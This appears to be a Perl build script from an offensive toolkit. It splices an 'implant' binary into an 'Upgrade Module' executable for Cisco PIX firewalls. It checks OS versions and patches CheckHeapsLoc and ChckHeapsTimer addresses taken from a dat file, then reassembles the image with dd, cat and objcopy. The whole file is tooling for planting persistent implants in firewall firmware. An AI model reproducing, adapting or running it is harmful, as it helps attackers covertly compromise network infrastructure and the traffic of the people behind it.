#! /usr/bin/perl

use bytes;
use Getopt::Std;

my $imp_space = 40960;

sub my_swap
{

  my($my_in) = @_;

  $my_out = ( ($my_in & 0xff) << 24 );
  $my_out |= ( (($my_in >>  8) & 0xFF) << 16 );
  $my_out |= ( (($my_in >> 16) & 0xFF) << 8  );
  $my_out |= ( (($my_in >> 24) & 0xFF) );
 
  return $my_out;
};
 
getopts("m:i:d:");

if ( !defined($opt_m) ||
     !defined($opt_i) ||
     !defined($opt_d) )
 {
   print "Usage $0 -m module.exe -i implant_file -d dat_file \n";
   exit;
 }

# check for the existence of the files

 if (!(-e $opt_m))
 {
    print "The Module file $opt_m doesn't seem to exist\n";
    exit;
 }

 if (!(-e $opt_i)) 
 {
    print "The implant file $opt_f doesn't seem to exist\n";
    exit;
 }

 if (!(-e $opt_d)) 
 {
    print "The dat file $opt_d doesn't seem to exist\n";
    exit;
 }
  
#open the implant file and check it's size

 ($dev, $ino, $mode, $nlink, $uid, $gid, $rdev, $size,
  $atime, $mtime, $ctime, $blksize, $blocks) = stat $opt_i;

 if ($size > $imp_space) 
 {
   print "Implant is larger than $imp_space. You'll have to update the Upgrade Module\n";
   exit;
 }

 $imp_size = $size;

#get the os_ver from the implant

 open(IMP, $opt_i) or die "Can't open $opt_i\n";

 binmode(IMP);

 $numread = read(IMP, $temp, 8) or die "read1:$!";

# now get it as an interger, swapped of course
 $imp_osver = my_swap( vec($temp,0,32));

# get the OS_Ver from the dat file

 open(DAT, $opt_d) or die "Can't open $opt_d\n";

 # read lines until we get the first line that starts with 0x
 do {$_ =  <DAT>} until m/^(0x\S+)/; 
 
 # $1 has the hex value of the os version
 $dat_osver = hex $1;

 if ($dat_osver != $imp_osver)
 {
   printf("The OS version of the Dat is not the same as the OS version in the implant\n");
   exit;
 }

# if we angle bracket DAT again we get the line after the OS version
# so we want to get the CheckHeapsLoc and the CHCKTIMER address from the dat

$heapscnt = 0;

 do {
  $_ = <DAT>;
  if (m/^CheckHeapsLoc/) 
  {
    $heapscnt++;
    $' =~ m/(0x\S+)/;
    $checkheapsloc = pack "i", hex $1;
    open(OUTHEAPSLOC, "> :raw","./temp1heapsloc");
    syswrite(OUTHEAPSLOC,$checkheapsloc,4);
    close(OUTHEAPSLOC);
  };
  if (m/^ChckHeapsTimer/) 
  {
    $heapscnt++;
    $' =~ m/(0x\S+)/;
    $chckheapstimer = pack "i", hex $1;
    open(OUTHEAPSTIME, "> :raw","./temp1heapstime");
    syswrite(OUTHEAPSTIME,$chckheapstimer,4);
    close(OUTHEAPSTIME);
  };
} until eof;

close DAT;

 if (!defined($chckheapstimer) || !defined($checkheapsloc))
 {
   printf("\nWARNING:\tThe dat file is missing both the CheckHeapsLoc and ChckHeapsTimer values.\n");
   printf("\t\tThese are essential if the PIX OS is 7.x\n\n");
 };

# so we have checked the OS versions and they match.
# we've opened up the DAT file and pulled out the values from the
# checkheapsloc and checkheapstimer  

# Now we want to get size of the .exe 
 ($dev, $ino, $mode, $nlink, $uid, $gid, $rdev, $size,
  $atime, $mtime, $ctime, $blksize, $blocks) = stat $opt_m;

# $size has the size of the .exe file
# we want to start choping up the file for reassembly

`dd if=/dev/zero of=zero_file bs=1 count=4`;

`dd if=$opt_m of=part1_$opt_m bs=1 count=4176`;

$imp_space_empty = $imp_space - $imp_size;

$skip = $imp_size + 4176;

`dd if=$opt_m of=imp_space bs=1 skip=$skip count=$imp_space_empty`;

$skip = 4176 + $imp_space + 8;

$elf_rest = $size - $skip;

`dd if=$opt_m of=part3_$opt_m bs=1 skip=$skip count=$elf_rest`;

`mv $opt_m old_$opt_m`;

if ( defined($checkheapsloc))
{
  if (defined($chckheapstimer))
  {
   `cat part1_$opt_m $opt_i imp_space temp1heapsloc temp1heapstime part3_$opt_m > $opt_m`
  }
  else
  {
   `cat part1_$opt_m $opt_i imp_space temp1heapsloc zero_file part3_$opt_m > $opt_m`
  }
}
else
 {
  if (defined($chckheapstimer))
  {
   `cat part1_$opt_m $opt_i imp_space zero_file temp1heapstime part3_$opt_m > $opt_m`
  }
  else
  {
   `cat part1_$opt_m $opt_i imp_space zero_file zero_file part3_$opt_m > $opt_m`
  }
}

`/usr/bin/objcopy --output-target=binary $opt_m $opt_m.bin`

#`rm part1_$opt_m imp_space ./temp1heapsloc ./temp1heapstime part3_$opt_m
